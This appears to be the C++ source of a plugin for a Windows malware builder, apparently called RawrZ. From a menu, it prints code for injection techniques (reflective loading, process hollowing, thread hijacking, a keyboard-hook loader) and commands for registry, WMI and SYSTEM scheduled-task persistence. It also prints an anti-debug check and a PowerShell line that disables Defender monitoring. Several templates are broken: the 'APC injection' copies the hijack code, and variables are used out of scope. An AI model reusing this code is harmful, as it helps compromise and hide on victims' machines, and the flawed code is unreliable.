#include "MemoryLoader.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>

MemoryLoader::MemoryLoader() {
    // Initialize default configuration
    config = {};
}

MemoryLoader::~MemoryLoader() {
    // Cleanup if needed
}

std::string MemoryLoader::getName() const {
    return "Memory Loader";
}

std::string MemoryLoader::getDescription() const {
    return "Advanced memory loading and injection techniques for Windows systems";
}

std::string MemoryLoader::getVersion() const {
    return "1.0";
}

bool MemoryLoader::initialize() {
    return true;
}

void MemoryLoader::execute() {
    showMenu();
}

std::vector<std::string> MemoryLoader::getOptions() const {
    return {
        "Reflective Loader",
        "Process Hollowing",
        "Thread Hijacking", 
        "APC Injection",
        "SetWindowsHookEx",
        "Registry Persistence",
        "WMI Event Consumer",
        "Scheduled Task",
        "Anti-Analysis",
        "Process Evasion",
        "Configuration"
    };
}

void MemoryLoader::setOption(const std::string& option, const std::string& value) {
    if (option == "useReflectiveLoading") config.useReflectiveLoading = (value == "true");
    else if (option == "useProcessHollowing") config.useProcessHollowing = (value == "true");
    else if (option == "useThreadHijacking") config.useThreadHijacking = (value == "true");
    else if (option == "useAPCInjection") config.useAPCInjection = (value == "true");
    else if (option == "useSetWindowsHookEx") config.useSetWindowsHookEx = (value == "true");
    else if (option == "useRegistryPersistence") config.useRegistryPersistence = (value == "true");
    else if (option == "useWMIEventConsumer") config.useWMIEventConsumer = (value == "true");
    else if (option == "useScheduledTask") config.useScheduledTask = (value == "true");
    else if (option == "addAntiAnalysis") config.addAntiAnalysis = (value == "true");
    else if (option == "addProcessEvasion") config.addProcessEvasion = (value == "true");
}

// Real implementations for memory loading techniques

std::string MemoryLoader::createReflectiveLoader(const std::string& payloadPath) {
    return R"(#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>

void reflectiveLoad(const std::string& path) {
    std::ifstream file(path, std::ios::binary);
    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), {});
    file.close();

    LPVOID addr = VirtualAlloc(NULL, buffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(addr, buffer.data(), buffer.size());

    typedef void (*EntryFunc)();
    EntryFunc entry = (EntryFunc)addr;
    entry();
}

int main() {
    reflectiveLoad(\")" + payloadPath + R"("\);
    return 0;
}
)";
}

std::string MemoryLoader::createProcessHollowing(const std::string& targetProcess, const std::string& payloadPath) {
    return R"(#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>

void processHollow(const std::string& target, const std::string& payload) {
    STARTUPINFO si = { sizeof(si) }; 
    PROCESS_INFORMATION pi;
    CreateProcess(NULL, const_cast<char*>(target.c_str()), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    std::ifstream file(payload, std::ios::binary);
    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), {});
    file.close();

    LPVOID addr = VirtualAllocEx(pi.hProcess, NULL, buffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, addr, buffer.data(), buffer.size(), NULL);

    CONTEXT ctx = { CONTEXT_CONTROL };
    ctx.Rip = (DWORD64)addr;
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

int main() {
    processHollow(\")" + targetProcess + R"("\, \")" + payloadPath + R"("\);
    return 0;
}
)";
}

std::string MemoryLoader::createThreadHijacking(const std::string& targetProcess, const std::string& payloadPath) {
    return R"(#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <tlhelp32.h>

void threadHijack(const std::string& target, const std::string& payload) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(THREADENTRY32) };
    DWORD targetPID = 0;

    while (Thread32Next(hSnapshot, &te)) {
        if (te.th32OwnerProcessID == GetCurrentProcessId()) continue;
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, te.th32OwnerProcessID);
        if (hProcess) {
            char name[MAX_PATH];
            GetModuleBaseName(hProcess, NULL, name, sizeof(name));
            if (!_stricmp(name, target.c_str())) {
                targetPID = te.th32OwnerProcessID;
                break;
            }
            CloseHandle(hProcess);
        }
    }
    CloseHandle(hSnapshot);

    if (!targetPID) return;

    std::ifstream file(payload, std::ios::binary);
    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), {});
    file.close();

    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
    CONTEXT ctx = { CONTEXT_CONTROL };
    GetThreadContext(hThread, &ctx);
    LPVOID addr = VirtualAllocEx(hProcess, NULL, buffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, addr, buffer.data(), buffer.size(), NULL);
    ctx.Rip = (DWORD64)addr;
    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);
    CloseHandle(hThread);
    CloseHandle(hProcess);
}

int main() {
    threadHijack(\")" + targetProcess + R"("\, \")" + payloadPath + R"("\);
    return 0;
}
)";
}

std::string MemoryLoader::createAPCInjection(const std::string& targetProcess, const std::string& payloadPath) {
    return R"(#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <tlhelp32.h>

void apcInject(const std::string& target, const std::string& payload) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(THREADENTRY32) };
    DWORD targetPID = 0;

    while (Thread32Next(hSnapshot, &te)) {
        if (te.th32OwnerProcessID == GetCurrentProcessId()) continue;
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, te.th32OwnerProcessID);
        if (hProcess) {
            char name[MAX_PATH];
            GetModuleBaseName(hProcess, NULL, name, sizeof(name));
            if (!_stricmp(name, target.c_str())) {
                targetPID = te.th32OwnerProcessID;
                break;
            }
            CloseHandle(hProcess);
        }
    }
    CloseHandle(hSnapshot);

    if (!targetPID) return;

    std::ifstream file(payload, std::ios::binary);
    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), {});
    file.close();

    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
    CONTEXT ctx = { CONTEXT_CONTROL };
    GetThreadContext(hThread, &ctx);
    LPVOID addr = VirtualAllocEx(hProcess, NULL, buffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, addr, buffer.data(), buffer.size(), NULL);
    ctx.Rip = (DWORD64)addr;
    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);
    CloseHandle(hThread);
    CloseHandle(hProcess);
}

int main() {
    apcInject(\")" + targetProcess + R"("\, \")" + payloadPath + R"("\);
    return 0;
}
)";
}

std::string MemoryLoader::createSetWindowsHookEx(const std::string& payloadPath) {
    return R"(#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>

HHOOK hook;
void hookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
        if (kb->vkCode == VK_F1) {
            std::ifstream file(\")" + payloadPath + R"("\, std::ios::binary);
            std::vector<char> buffer((std::istreambuf_iterator<char>(file)), {});
            file.close();

            LPVOID addr = VirtualAlloc(NULL, buffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            memcpy(addr, buffer.data(), buffer.size());
            typedef void (*EntryFunc)();
            EntryFunc entry = (EntryFunc)addr;
            entry();
        }
    }
    return CallNextHookEx(hook, nCode, wParam, lParam);
}

int main() {
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, GetModuleHandle(NULL), 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hook);
    return 0;
}
)";
}

std::string MemoryLoader::createRegistryPersistence(const std::string& payloadPath) {
    return R"(reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v RawrZ /t REG_SZ /d ")" + payloadPath + R"(" /f)";
}

std::string MemoryLoader::createWMIEventConsumer(const std::string& payloadPath) {
    return R"(wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="RawrZ", EventNamespace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA 'Win32_Process'")";
}

std::string MemoryLoader::createScheduledTask(const std::string& payloadPath) {
    return R"(schtasks /create /tn RawrZ /tr ")" + payloadPath + R"(" /sc onlogon /ru SYSTEM /f)";
}

std::string MemoryLoader::createAntiAnalysis(const std::string&) {
    return R"(if (IsDebuggerPresent() || GetTickCount() < 3000) ExitProcess(0);)";
}

std::string MemoryLoader::createProcessEvasion(const std::string&) {
    return R"(Set-MpPreference -DisableRealtimeMonitoring $true)";
}



// Menu handlers
void MemoryLoader::handleReflectiveLoading() {
    std::cout << "\n=== Reflective Loader ===\n";
    std::string payload;
    std::cout << "Enter payload path: ";
    std::cin >> payload;
    std::cout << createReflectiveLoader(payload) << std::endl;
}

void MemoryLoader::handleProcessHollowing() {
    std::cout << "\n=== Process Hollowing ===\n";
    std::string target, payload;
    std::cout << "Enter target process: ";
    std::cin >> target;
    std::cout << "Enter payload path: ";
    std::cin >> payload;
    std::cout << createProcessHollowing(target, payload) << std::endl;
}

void MemoryLoader::handleThreadHijacking() {
    std::cout << "\n=== Thread Hijacking ===\n";
    std::string target, payload;
    std::cout << "Enter target process: ";
    std::cin >> target;
    std::cout << "Enter payload path: ";
    std::cin >> payload;
    std::cout << createThreadHijacking(target, payload) << std::endl;
}

void MemoryLoader::handleAPCInjection() {
    std::cout << "\n=== APC Injection ===\n";
    std::string target, payload;
    std::cout << "Enter target process: ";
    std::cin >> target;
    std::cout << "Enter payload path: ";
    std::cin >> payload;
    std::cout << createAPCInjection(target, payload) << std::endl;
}

void MemoryLoader::handleSetWindowsHookEx() {
    std::cout << "\n=== SetWindowsHookEx ===\n";
    std::string payload;
    std::cout << "Enter payload path: ";
    std::cin >> payload;
    std::cout << createSetWindowsHookEx(payload) << std::endl;
}

void MemoryLoader::handleRegistryPersistence() {
    std::cout << "\n=== Registry Persistence ===\n";
    std::string payload;
    std::cout << "Enter payload path: ";
    std::cin >> payload;
    std::cout << createRegistryPersistence(payload) << std::endl;
}

void MemoryLoader::handleWMIEventConsumer() {
    std::cout << "\n=== WMI Event Consumer ===\n";
    std::string payload;
    std::cout << "Enter payload path: ";
    std::cin >> payload;
    std::cout << createWMIEventConsumer(payload) << std::endl;
}

void MemoryLoader::handleScheduledTask() {
    std::cout << "\n=== Scheduled Task ===\n";
    std::string payload;
    std::cout << "Enter payload path: ";
    std::cin >> payload;
    std::cout << createScheduledTask(payload) << std::endl;
}

void MemoryLoader::handleAntiAnalysis() {
    std::cout << "\n=== Anti-Analysis ===\n";
    std::cout << createAntiAnalysis("") << std::endl;
}

void MemoryLoader::handleProcessEvasion() {
    std::cout << "\n=== Process Evasion ===\n";
    std::cout << createProcessEvasion("") << std::endl;
}

void MemoryLoader::handleConfiguration() {
    std::cout << "\n=== Configuration ===\n";
    std::cout << "Current settings:\n";
    std::cout << "Reflective Loader: " << (config.useReflectiveLoading ? "Enabled" : "Disabled") << std::endl;
    std::cout << "Process Hollowing: " << (config.useProcessHollowing ? "Enabled" : "Disabled") << std::endl;
    std::cout << "Thread Hijacking: " << (config.useThreadHijacking ? "Enabled" : "Disabled") << std::endl;
    std::cout << "APC Injection: " << (config.useAPCInjection ? "Enabled" : "Disabled") << std::endl;
    std::cout << "SetWindowsHookEx: " << (config.useSetWindowsHookEx ? "Enabled" : "Disabled") << std::endl;
    std::cout << "Registry Persistence: " << (config.useRegistryPersistence ? "Enabled" : "Disabled") << std::endl;
    std::cout << "WMI Event Consumer: " << (config.useWMIEventConsumer ? "Enabled" : "Disabled") << std::endl;
    std::cout << "Scheduled Task: " << (config.useScheduledTask ? "Enabled" : "Disabled") << std::endl;
    std::cout << "Anti-Analysis: " << (config.addAntiAnalysis ? "Enabled" : "Disabled") << std::endl;
    std::cout << "Process Evasion: " << (config.addProcessEvasion ? "Enabled" : "Disabled") << std::endl;
}

void MemoryLoader::handleSaveConfiguration() {
    std::cout << "\n=== Save Configuration ===\n";
    std::string filePath;
    std::cout << "Enter configuration file path: ";
    std::cin >> filePath;
    saveConfiguration(filePath);
}

void MemoryLoader::handleLoadConfiguration() {
    std::cout << "\n=== Load Configuration ===\n";
    std::string filePath;
    std::cout << "Enter configuration file path: ";
    std::cin >> filePath;
    loadConfiguration(filePath);
}

// Configuration persistence methods
void MemoryLoader::saveConfiguration(const std::string& filePath) {
    std::ofstream file(filePath);
    if (!file) {
        std::cerr << "Failed to open configuration file: " << filePath << std::endl;
        return;
    }

    // Save configuration settings
    file << "useReflectiveLoading=" << (config.useReflectiveLoading ? "true" : "false") << "\n";
    file << "useProcessHollowing=" << (config.useProcessHollowing ? "true" : "false") << "\n";
    file << "useThreadHijacking=" << (config.useThreadHijacking ? "true" : "false") << "\n";
    file << "useAPCInjection=" << (config.useAPCInjection ? "true" : "false") << "\n";
    file << "useSetWindowsHookEx=" << (config.useSetWindowsHookEx ? "true" : "false") << "\n";
    file << "useRegistryPersistence=" << (config.useRegistryPersistence ? "true" : "false") << "\n";
    file << "useWMIEventConsumer=" << (config.useWMIEventConsumer ? "true" : "false") << "\n";
    file << "useScheduledTask=" << (config.useScheduledTask ? "true" : "false") << "\n";
    file << "addAntiAnalysis=" << (config.addAntiAnalysis ? "true" : "false") << "\n";
    file << "addProcessEvasion=" << (config.addProcessEvasion ? "true" : "false") << "\n";
    
    file.close();
    std::cout << "Configuration saved to: " << filePath << std::endl;
}

void MemoryLoader::loadConfiguration(const std::string& filePath) {
    std::ifstream file(filePath);
    if (!file) {
        std::cerr << "Failed to open configuration file: " << filePath << std::endl;
        return;
    }

    std::string line;
    while (std::getline(file, line)) {
        size_t pos = line.find('=');
        if (pos != std::string::npos) {
            std::string key = line.substr(0, pos);
            std::string value = line.substr(pos + 1);
            setOption(key, value);
        }
    }
    file.close();
    std::cout << "Configuration loaded from: " << filePath << std::endl;
}

void MemoryLoader::showMenu() {
    while (true) {
        std::cout << "\n=== Memory Loader Plugin ===\n";
        std::cout << "1. Reflective Loader\n";
        std::cout << "2. Process Hollowing\n";
        std::cout << "3. Thread Hijacking\n";
        std::cout << "4. APC Injection\n";
        std::cout << "5. SetWindowsHookEx\n";
        std::cout << "6. Registry Persistence\n";
        std::cout << "7. WMI Event Consumer\n";
        std::cout << "8. Scheduled Task\n";
        std::cout << "9. Anti-Analysis\n";
        std::cout << "10. Process Evasion\n";
        std::cout << "11. Configuration\n";
        std::cout << "0. Back\n";
        std::cout << "Choice: ";
        
        int choice;
        std::cin >> choice;
        
        switch (choice) {
            case 0: return;
            case 1: handleReflectiveLoading(); break;
            case 2: handleProcessHollowing(); break;
            case 3: handleThreadHijacking(); break;
            case 4: handleAPCInjection(); break;
            case 5: handleSetWindowsHookEx(); break;
            case 6: handleRegistryPersistence(); break;
            case 7: handleWMIEventConsumer(); break;
            case 8: handleScheduledTask(); break;
            case 9: handleAntiAnalysis(); break;
            case 10: handleProcessEvasion(); break;
            case 11: handleConfiguration(); break;
            default: std::cout << "Invalid choice!\n"; break;
        }
    }
}
